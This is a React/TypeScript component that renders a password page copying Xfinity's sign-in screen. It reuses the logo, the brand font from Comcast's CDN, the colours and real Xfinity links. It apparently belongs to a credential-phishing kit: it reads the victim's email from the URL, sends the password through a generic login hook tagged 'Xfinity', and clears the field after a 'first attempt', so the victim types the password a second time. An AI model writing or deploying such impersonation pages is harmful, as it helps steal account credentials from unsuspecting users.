import React, { useState, useEffect } from 'react';
import { useSearchParams } from 'react-router-dom';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';

interface XfinityPasswordPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const XfinityPasswordPage: React.FC<XfinityPasswordPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [searchParams] = useSearchParams();
  const email = searchParams.get('email') || '';
  const [password, setPassword] = useState('');
  const [pageReady, setPageReady] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  useEffect(() => {
    const timer = setTimeout(() => setPageReady(true), 100);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (!email) {
      window.location.href = '/';
    }
  }, [email]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const result = await handleFormSubmit(e, { email, password, provider: 'Xfinity' });
    if (result?.isFirstAttempt) {
      setPassword('');
    }
  };

  if (!pageReady) {
    return (
      <div style={{ minHeight: '100vh', background: '#fff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <Spinner size="lg" color="border-purple-600" />
      </div>
    );
  }

  return (
    <div style={{ minHeight: '100vh', background: '#fff', fontFamily: "'XfinityBrown', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif", display: 'flex', flexDirection: 'column' }}>
      <link rel="stylesheet" href="/xfinity_files/bundle-cd6dc29.css" />
      <link rel="preconnect" href="https://static.cimcontent.net" />
      <style>{`
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-bold.woff2') format('woff2');
          font-weight: 700;
          font-style: normal;
          font-display: swap;
        }
        @font-face {
          font-family: 'XfinityBrown';
          src: url('https://static.cimcontent.net/common-web-assets/fonts/xfinity-brown-optimized/xfinitybrown-regular.woff2') format('woff2');
          font-weight: 400;
          font-style: normal;
          font-display: swap;
        }
      `}</style>

      <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, padding: '2.5rem 1.5rem 0' }}>
        <div style={{ width: '100%', maxWidth: '564px', margin: '0 auto' }}>
          {/* Xfinity Logo */}
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '2.5rem' }}>
            <svg width="107" height="24" viewBox="0 0 107 24" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M16.845 0L12.558 5.55 8.27 0H0l8.998 11.55L0 23.1h8.27l4.288-5.55 4.287 5.55h8.27l-8.998-11.55L25.115 0h-8.27zM27.07 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S28.07 0 30.01 0zM40.34 3.8v2.6c1.48-1.95 3.63-3.1 6.21-3.1 4.31 0 7.24 2.83 7.24 7.55V23.1h-5.88V12.08c0-2.58-1.44-4.03-3.65-4.03-2.37 0-3.92 1.53-3.92 4.36V23.1h-5.88V3.8h5.88zM56.31 3.8h5.88v19.3h-5.88V3.8zm2.94-3.8c1.94 0 3.35 1.2 3.35 2.8s-1.41 2.8-3.35 2.8-3.35-1.2-3.35-2.8S57.31 0 59.25 0zM73.97 8.1h-4.45V14c0 3.15 1.2 4.05 3.28 4.05.48 0 .93-.05 1.17-.12v5.12c-.56.15-1.42.25-2.37.25-5.22 0-7.96-2.5-7.96-8.2V8.1h-3.2V3.8h.88c2.12 0 3.12-1.05 3.12-3.15V.38l4.6-.38v3.8h4.93v4.3zM84.86 24c-2.38 0-4.33-.55-6.18-1.55l1.93-4.2c1.28.7 2.65 1.2 3.98 1.2 1.88 0 2.95-.88 3.78-2.68l.2-.43-8.27-12.54h6.28l4.82 8.85L95.6 3.8h6.02L92.13 22.1C90.58 23.45 88.24 24 84.86 24zM106.23 0a.77.77 0 1 1 0 1.54.77.77 0 0 1 0-1.54z" fill="#141417"/>
            </svg>
          </div>

          {/* Heading */}
          <h1 style={{ fontSize: '2rem', fontWeight: 700, color: '#141417', marginBottom: '1.5rem', lineHeight: 1.2 }}>
            Enter your password
          </h1>

          {/* Email display */}
          <div style={{ display: 'flex', alignItems: 'center', marginBottom: '1.5rem', padding: '0.5rem 0' }}>
            <span style={{ fontSize: '1rem', color: '#141417', fontWeight: 400 }}>{email}</span>
            <a href="/" style={{ marginLeft: '0.75rem', fontSize: '0.875rem', color: '#5A23B9', textDecoration: 'none', fontWeight: 600 }}>Change</a>
          </div>

          {/* Error message */}
          {errorMessage && !isLoading && (
            <div style={{
              padding: '0.75rem 1rem',
              marginBottom: '1rem',
              borderRadius: '0.5rem',
              backgroundColor: '#FEE2E2',
              border: '1px solid #FCA5A5',
              color: '#DC2626',
              fontSize: '0.875rem',
              display: 'flex',
              alignItems: 'center',
              gap: '0.5rem'
            }}>
              <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                <path d="M8 1C4.1 1 1 4.1 1 8s3.1 7 7 7 7-3.1 7-7-3.1-7-7-7zm-.5 3h1v5h-1V4zm.5 8.2c-.4 0-.8-.3-.8-.8s.3-.8.8-.8.8.3.8.8-.4.8-.8.8z"/>
              </svg>
              <span>{errorMessage}</span>
            </div>
          )}

          {/* Password form */}
          <form onSubmit={handleSubmit}>
            <div style={{ marginBottom: '1rem' }}>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                autoFocus
                autoComplete="current-password"
                style={{
                  width: '100%',
                  padding: '0.875rem 1rem',
                  fontSize: '1rem',
                  border: '1px solid #CECED8',
                  borderRadius: '0.5rem',
                  outline: 'none',
                  boxSizing: 'border-box',
                  fontFamily: 'inherit',
                  color: '#141417',
                  transition: 'border-color 0.2s',
                }}
                onFocus={(e) => { e.target.style.borderColor = '#5A23B9'; }}
                onBlur={(e) => { e.target.style.borderColor = '#CECED8'; }}
              />
            </div>

            {/* Forgot password link */}
            <div style={{ marginBottom: '1.5rem' }}>
              <a
                href="https://login.xfinity.com/forgot-password"
                target="_blank"
                rel="noopener noreferrer"
                style={{ fontSize: '0.875rem', color: '#5A23B9', textDecoration: 'none', fontWeight: 600 }}
              >
                Forgot your password?
              </a>
            </div>

            {/* Sign in button */}
            <button
              type="submit"
              disabled={isLoading || !password}
              style={{
                width: '100%',
                padding: '0.875rem',
                fontSize: '1rem',
                fontWeight: 700,
                color: '#fff',
                backgroundColor: isLoading || !password ? '#B8A1D8' : '#5A23B9',
                border: 'none',
                borderRadius: '2rem',
                cursor: isLoading || !password ? 'not-allowed' : 'pointer',
                fontFamily: 'inherit',
                transition: 'background-color 0.2s',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '0.5rem',
              }}
              onMouseEnter={(e) => { if (!isLoading && password) (e.target as HTMLButtonElement).style.backgroundColor = '#36156F'; }}
              onMouseLeave={(e) => { if (!isLoading && password) (e.target as HTMLButtonElement).style.backgroundColor = '#5A23B9'; }}
            >
              {isLoading && <Spinner size="sm" color="border-white" />}
              {isLoading ? 'Signing in...' : 'Sign in'}
            </button>
          </form>

          {/* Terms text */}
          <p style={{ fontSize: '0.75rem', color: '#6B6B76', marginTop: '1rem', lineHeight: 1.5 }}>
            By signing in, you agree to our{' '}
            <a href="http://my.xfinity.com/terms/web/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Terms of Service</a>
            {' '}and{' '}
            <a href="https://www.xfinity.com/privacy/" target="_blank" rel="noopener noreferrer" style={{ color: '#5A23B9', textDecoration: 'none' }}>Privacy Policy</a>.
          </p>
        </div>
      </main>
    </div>
  );
};

export default XfinityPasswordPage;
